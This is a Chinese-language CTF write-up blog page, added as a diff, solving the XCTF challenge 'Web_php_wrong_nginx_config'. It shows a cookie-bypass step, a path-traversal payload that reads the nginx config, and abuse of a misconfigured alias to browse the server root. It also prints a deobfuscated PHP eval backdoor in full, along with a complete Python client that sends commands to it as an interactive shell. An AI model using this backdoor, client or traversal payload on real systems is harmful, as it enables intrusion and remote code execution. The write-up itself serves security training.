@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="banbird">
+
+
+    <meta name="subtitle" content="Peace & Love">
+
+
+    <meta name="description" content="愿有人陪你颠沛流离">
+
+
+
+<title>Web_php_wrong_nginx_config | Blacknight</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">blacknight&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/links">Friends</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">blacknight&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/links">Friends</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Web_php_wrong_nginx_config</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">banbird</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">August 9, 2020&nbsp;&nbsp;23:30:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/buu%E5%88%B7%E9%A2%98/">buu刷题</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>平台：<a href="https://adworld.xctf.org.cn/" target="_blank" rel="noopener">https://adworld.xctf.org.cn/</a><br>打开是个登录框，但登录不了，扫目录发现robots.txt<br><img src="https://img-blog.csdnimg.cn/20200809211937256.png" alt="在这里插入图片描述"><br>hint.php<br><img src="https://img-blog.csdnimg.cn/20200809211959359.png" alt="在这里插入图片描述"><br>Hack.php弹窗需要登录但抓包发现cookie处有个isLogin=0，抓包修改为1进入页面，同样手动修改cookie处isLogin为1使得不再跳转回登录页面<br><img src="https://img-blog.csdnimg.cn/20200809212216395.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>url可能存在文件包含<br><img src="https://img-blog.csdnimg.cn/20200809212254427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>构造<code>admin/admin.php?file=..././..././..././..././etc/nginx/sites-enabled/site.conf&amp;ext=</code>读取hint.php中的文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen <span class="number">8080</span>; <span class="comment">## listen for ipv4; this line is default and implied</span></span><br><span class="line">    listen [::]:<span class="number">8080</span>; <span class="comment">## listen for ipv6</span></span><br><span class="line"></span><br><span class="line">    root /<span class="keyword">var</span>/www/html;</span><br><span class="line">    index index.php index.html index.htm;</span><br><span class="line">    port_in_redirect off;</span><br><span class="line">    server_name _;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Make site accessible from http://localhost/</span></span><br><span class="line">    <span class="comment">#server_name localhost;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># If block for setting the time for the logfile</span></span><br><span class="line">    <span class="keyword">if</span> ($time_iso8601 ~ <span class="string">"^(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)"</span>) &#123;</span><br><span class="line">       set $year $<span class="number">1</span>;</span><br><span class="line">       set $month $<span class="number">2</span>;</span><br><span class="line">       set $day $<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html</span></span><br><span class="line">    sendfile off;</span><br><span class="line"></span><br><span class="line">        set $http_x_forwarded_for_filt $http_x_forwarded_for;</span><br><span class="line">        <span class="keyword">if</span> ($http_x_forwarded_for_filt ~ ([<span class="number">0</span><span class="number">-9</span>]+\.[<span class="number">0</span><span class="number">-9</span>]+\.[<span class="number">0</span><span class="number">-9</span>]+\.)[<span class="number">0</span><span class="number">-9</span>]+) &#123;</span><br><span class="line">                set $http_x_forwarded_for_filt $<span class="number">1</span>???;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add stdout logging</span></span><br><span class="line"></span><br><span class="line">    access_log /<span class="keyword">var</span>/log/nginx/$hostname-access-$year-$month-$day.log openshift_log;</span><br><span class="line">    error_log /<span class="keyword">var</span>/log/nginx/error.log info;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        <span class="comment"># First attempt to serve request as file, then</span></span><br><span class="line">        <span class="comment"># as directory, then fall back to index.html</span></span><br><span class="line">        try_files $uri $uri/ /index.php?q=$uri&amp;$args;</span><br><span class="line">        server_tokens off;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#error_page 404 /404.html;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># redirect server error pages to the static page /50x.html</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    error_page <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span> /<span class="number">50</span>x.html;</span><br><span class="line">    location = /<span class="number">50</span>x.html &#123;</span><br><span class="line">        root /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">        try_files $uri $uri/ /index.php?q=$uri&amp;$args;</span><br><span class="line">        fastcgi_split_path_info ^(.+\.php)(/.+)$;</span><br><span class="line">        fastcgi_pass unix:/<span class="keyword">var</span>/run/php/php5<span class="number">.6</span>-fpm.sock;</span><br><span class="line">        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">        fastcgi_param SCRIPT_NAME $fastcgi_script_name;</span><br><span class="line">        fastcgi_index index.php;</span><br><span class="line">        <span class="keyword">include</span> fastcgi_params;</span><br><span class="line">        fastcgi_param REMOTE_ADDR $http_x_forwarded_for;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ /\. &#123;</span><br><span class="line">            log_not_found off;</span><br><span class="line">            deny all;</span><br><span class="line">    &#125;</span><br><span class="line">    location /web-img &#123;</span><br><span class="line">        alias /images/;</span><br><span class="line">        autoindex on;</span><br><span class="line">    &#125;</span><br><span class="line">    location ~* \.(ini|docx|pcapng|doc)$ &#123;  </span><br><span class="line">         deny all;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span> /<span class="keyword">var</span>/www/nginx[.]conf;</span><br><span class="line">&#125;&lt;!DOCTYPE html&gt;</span><br></pre></td></tr></table></figure>
+<p>这里涉及到了知识盲区<br>nginx中root和alias都可以定义在location模块中，都是用来指定请求资源的真实路径。 但root中真实的路径是root指定的值加上location指定的值 ，而alias指定的路径是location的别名，不管location的值怎么写，资源的真实路径都是 alias 指定的路径 。<br>举个例子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location /blacknight/ &#123;</span><br><span class="line">  root /data/<span class="keyword">static</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>假设我们访问：<a href="http://localhost:80/blacknight/test.html" target="_blank" rel="noopener">http://localhost:80/blacknight/test.html</a><br>root的实际真实路径是：<a href="http://localhost:80/data/static/blacknight/test.html" target="_blank" rel="noopener">http://localhost:80/data/static/blacknight/test.html</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location /blacknight/ &#123;</span><br><span class="line">  alias /data/<span class="keyword">static</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>假设我们访问：<a href="http://localhost:80/blacknight/test.html" target="_blank" rel="noopener">http://localhost:80/blacknight/test.html</a><br>alias的实际真实路径是：<a href="http://localhost:80/data/static/test.html" target="_blank" rel="noopener">http://localhost:80/data/static/test.html</a><br>这里我们访问web-img../直接可以访问到根目录<br><img src="https://img-blog.csdnimg.cn/20200809215257166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在www目录下找到Hack.php.bak，应该是被混淆了<br><img src="https://img-blog.csdnimg.cn/20200809215422936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输出$f得代码<br><img src="https://img-blog.csdnimg.cn/20200809215954109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>整理一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$kh=<span class="string">"42f7"</span>;</span><br><span class="line">$kf=<span class="string">"e9ac"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">($t,$k)</span> </span>&#123;</span><br><span class="line">	$c=strlen($k);</span><br><span class="line">	$l=strlen($t);</span><br><span class="line">	$o=<span class="string">""</span>;</span><br><span class="line">	<span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;$l;) &#123;</span><br><span class="line">		<span class="keyword">for</span> ($j=<span class="number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++) &#123;</span><br><span class="line">			$o.=$t &#123;</span><br><span class="line">				$i</span><br><span class="line">			&#125;</span><br><span class="line">			^$k &#123;</span><br><span class="line">				$j</span><br><span class="line">			&#125;</span><br><span class="line">			;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $o;</span><br><span class="line">&#125;</span><br><span class="line">$r=$_SERVER;</span><br><span class="line">$rr=@$r[<span class="string">"HTTP_REFERER"</span>];</span><br><span class="line">$ra=@$r[<span class="string">"HTTP_ACCEPT_LANGUAGE"</span>];</span><br><span class="line"><span class="keyword">if</span>($rr&amp;&amp;$ra) &#123;</span><br><span class="line">	$u=parse_url($rr);</span><br><span class="line">	parse_str($u[<span class="string">"query"</span>],$q);</span><br><span class="line">	$q=array_values($q);</span><br><span class="line">	preg_match_all(<span class="string">"/([\w])[\w-]+(?:;q=0.([\d]))?,?/"</span>,$ra,$m);</span><br><span class="line">	<span class="keyword">if</span>($q&amp;&amp;$m) &#123;</span><br><span class="line">		@session_start();</span><br><span class="line">		$s=&amp;$_SESSION;</span><br><span class="line">		$ss=<span class="string">"substr"</span>;</span><br><span class="line">		$sl=<span class="string">"strtolower"</span>;</span><br><span class="line">		$i=$m[<span class="number">1</span>][<span class="number">0</span>].$m[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">		$h=$sl($ss(md5($i.$kh),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">		$f=$sl($ss(md5($i.$kf),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">		$p=<span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span> ($z=<span class="number">1</span>;$z&lt;count($m[<span class="number">1</span>]);$z++)$p.=$q[$m[<span class="number">2</span>][$z]];</span><br><span class="line">		<span class="keyword">if</span>(strpos($p,$h)===<span class="number">0</span>) &#123;</span><br><span class="line">			$s[$i]=<span class="string">""</span>;</span><br><span class="line">			$p=$ss($p,<span class="number">3</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(array_key_exists($i,$s)) &#123;</span><br><span class="line">			$s[$i].=$p;</span><br><span class="line">			$e=strpos($s[$i],$f);</span><br><span class="line">			<span class="keyword">if</span>($e) &#123;</span><br><span class="line">				$k=$kh.$kf;</span><br><span class="line">				ob_start();</span><br><span class="line">				@<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">"/_/"</span>,<span class="string">"/-/"</span>),<span class="keyword">array</span>(<span class="string">"/"</span>,<span class="string">"+"</span>),$ss($s[$i],<span class="number">0</span>,$e))),$k)));</span><br><span class="line">				$o=ob_get_contents();</span><br><span class="line">				ob_end_clean();</span><br><span class="line">				$d=base64_encode(x(gzcompress($o),$k));</span><br><span class="line">				<span class="keyword">print</span>(<span class="string">"&lt;$k&gt;$d&lt;/$k&gt;"</span>);</span><br><span class="line">				@session_destroy();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>参考一个<a href="https://www.cnblogs.com/go2bed/p/5920811.html" target="_blank" rel="noopener">PHP混淆后门的分析</a><br>直接拿的脚本，修改下参数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line">from random import randint,choice</span><br><span class="line">from hashlib import md5</span><br><span class="line">import urllib</span><br><span class="line">import string</span><br><span class="line">import zlib</span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def choicePart(seq,amount):</span><br><span class="line">    length = len(seq)</span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">0</span> <span class="keyword">or</span> length &lt; amount:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Error Input'</span></span><br><span class="line">        <span class="keyword">return</span> None</span><br><span class="line">    result = []</span><br><span class="line">    indexes = []</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> count &lt; amount:</span><br><span class="line">        i = randint(<span class="number">0</span>,length<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">if</span> not i in indexes:</span><br><span class="line">            indexes.append(i)</span><br><span class="line">            result.append(seq[i])</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count == amount:</span><br><span class="line">                <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">def randBytesFlow(amount):</span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i in xrange(amount):</span><br><span class="line">        result += chr(randint(<span class="number">0</span>,<span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span>  result</span><br><span class="line"></span><br><span class="line">def randAlpha(amount):</span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i in xrange(amount):</span><br><span class="line">        result += choice(string.ascii_letters)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">def loopXor(text,key):</span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    lenKey = len(key)</span><br><span class="line">    lenTxt = len(text)</span><br><span class="line">    iTxt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> iTxt &lt; lenTxt:</span><br><span class="line">        iKey = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> iTxt&lt;lenTxt <span class="keyword">and</span> iKey&lt;lenKey:</span><br><span class="line">            result += chr(ord(key[iKey]) ^ ord(text[iTxt]))</span><br><span class="line">            iTxt += <span class="number">1</span></span><br><span class="line">            iKey += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debugPrint(msg):</span><br><span class="line">    <span class="keyword">if</span> debugging:</span><br><span class="line">        <span class="keyword">print</span> msg</span><br><span class="line"></span><br><span class="line"><span class="comment"># config</span></span><br><span class="line">debugging = <span class="keyword">False</span></span><br><span class="line">keyh = <span class="string">"42f7"</span> <span class="comment"># $kh</span></span><br><span class="line">keyf = <span class="string">"e9ac"</span> <span class="comment"># $kf</span></span><br><span class="line">xorKey = keyh + keyf</span><br><span class="line">url = <span class="string">'http://220.249.52.133:43429/hack.php'</span></span><br><span class="line">defaultLang = <span class="string">'zh-CN'</span></span><br><span class="line">languages = [<span class="string">'zh-TW;q=0.%d'</span>,<span class="string">'zh-HK;q=0.%d'</span>,<span class="string">'en-US;q=0.%d'</span>,<span class="string">'en;q=0.%d'</span>]</span><br><span class="line">proxies = None <span class="comment"># &#123;'http':'http://127.0.0.1:8080'&#125; # proxy for debug</span></span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate random Accept-Language only once each session</span></span><br><span class="line">langTmp = choicePart(languages,<span class="number">3</span>)</span><br><span class="line">indexes = sorted(choicePart(range(<span class="number">1</span>,<span class="number">10</span>),<span class="number">3</span>), reverse=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line">acceptLang = [defaultLang]</span><br><span class="line"><span class="keyword">for</span> i in xrange(<span class="number">3</span>):</span><br><span class="line">    acceptLang.append(langTmp[i] % (indexes[i],))</span><br><span class="line">acceptLangStr = <span class="string">','</span>.join(acceptLang)</span><br><span class="line">debugPrint(acceptLangStr)</span><br><span class="line"></span><br><span class="line">init2Char = acceptLang[<span class="number">0</span>][<span class="number">0</span>] + acceptLang[<span class="number">1</span>][<span class="number">0</span>] <span class="comment"># $i</span></span><br><span class="line">md5head = (md5(init2Char + keyh).hexdigest())[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">md5tail = (md5(init2Char + keyf).hexdigest())[<span class="number">0</span>:<span class="number">3</span>] + randAlpha(randint(<span class="number">3</span>,<span class="number">8</span>))</span><br><span class="line">debugPrint(<span class="string">'$i is %s'</span> % (init2Char))</span><br><span class="line">debugPrint(<span class="string">'md5 head: %s'</span> % (md5head,))</span><br><span class="line">debugPrint(<span class="string">'md5 tail: %s'</span> % (md5tail,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interactive php shell</span></span><br><span class="line">cmd = raw_input(<span class="string">'phpshell &gt; '</span>)</span><br><span class="line"><span class="keyword">while</span> cmd != <span class="string">''</span>:</span><br><span class="line">    <span class="comment"># build junk data in referer</span></span><br><span class="line">    query = []</span><br><span class="line">    <span class="keyword">for</span> i in xrange(max(indexes)+<span class="number">1</span>+randint(<span class="number">0</span>,<span class="number">2</span>)):</span><br><span class="line">        key = randAlpha(randint(<span class="number">3</span>,<span class="number">6</span>))</span><br><span class="line">        value = base64.urlsafe_b64encode(randBytesFlow(randint(<span class="number">3</span>,<span class="number">12</span>)))</span><br><span class="line">        query.append((key, value))</span><br><span class="line">    debugPrint(<span class="string">'Before insert payload:'</span>)</span><br><span class="line">    debugPrint(query)</span><br><span class="line">    debugPrint(urllib.urlencode(query))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># encode payload</span></span><br><span class="line">    payload = zlib.compress(cmd)</span><br><span class="line">    payload = loopXor(payload,xorKey)</span><br><span class="line">    payload = base64.urlsafe_b64encode(payload)</span><br><span class="line">    payload = md5head + payload</span><br><span class="line"></span><br><span class="line">    <span class="comment"># cut payload, replace into referer</span></span><br><span class="line">    cutIndex = randint(<span class="number">2</span>,len(payload)<span class="number">-3</span>)</span><br><span class="line">    payloadPieces = (payload[<span class="number">0</span>:cutIndex], payload[cutIndex:], md5tail)</span><br><span class="line">    iPiece = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i in indexes:</span><br><span class="line">        query[i] = (query[i][<span class="number">0</span>],payloadPieces[iPiece])</span><br><span class="line">        iPiece += <span class="number">1</span></span><br><span class="line">    referer = url + <span class="string">'?'</span> + urllib.urlencode(query)</span><br><span class="line">    debugPrint(<span class="string">'After insert payload, referer is:'</span>)</span><br><span class="line">    debugPrint(query)</span><br><span class="line">    debugPrint(referer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send request</span></span><br><span class="line">    r = sess.get(url,headers=&#123;<span class="string">'Accept-Language'</span>:acceptLangStr,<span class="string">'Referer'</span>:referer&#125;,proxies=proxies)</span><br><span class="line">    html = r.text</span><br><span class="line">    debugPrint(html)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># process response</span></span><br><span class="line">    pattern = re.compile(r<span class="string">'&lt;%s&gt;(.*)&lt;/%s&gt;'</span> % (xorKey,xorKey))</span><br><span class="line">    output = pattern.findall(html)</span><br><span class="line">    <span class="keyword">if</span> len(output) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Error,  no backdoor response'</span></span><br><span class="line">        cmd = raw_input(<span class="string">'phpshell &gt; '</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    output = output[<span class="number">0</span>]</span><br><span class="line">    debugPrint(output)</span><br><span class="line">    output = output.decode(<span class="string">'base64'</span>)</span><br><span class="line">    output = loopXor(output,xorKey)</span><br><span class="line">    output = zlib.decompress(output)</span><br><span class="line">    <span class="keyword">print</span> output</span><br><span class="line">    cmd = raw_input(<span class="string">'phpshell &gt; '</span>)</span><br></pre></td></tr></table></figure>
+<p>shell拿flag<br><img src="https://img-blog.csdnimg.cn/20200809220810512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>又是无情靠wp过活的一天~</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>banbird</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://www.blacknight.top/2020/08/09/Web_php_wrong_nginx_config/">http://www.blacknight.top/2020/08/09/Web_php_wrong_nginx_config/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
